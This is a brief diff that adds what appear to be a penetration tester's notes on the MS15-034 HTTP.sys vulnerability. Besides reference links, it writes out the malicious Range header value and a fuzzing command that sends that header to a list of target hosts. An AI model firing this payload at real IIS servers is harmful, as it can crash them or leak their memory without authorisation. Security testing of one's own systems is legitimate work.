@@ -1,0 +1,10 @@
+# ms15-034
+
+http://www.securitysift.com/an-analysis-of-ms15-034/
+
+might need to issue a pre request first
+http://pastebin.com/ypURDPc4
+see msf module too
+Range" => "bytes=0-18446744073709551615 # carrier
+
+http_fuzz url=http://FILE0/ header='Range: bytes=0-18446744073709551615' 0=http-sys.hosts
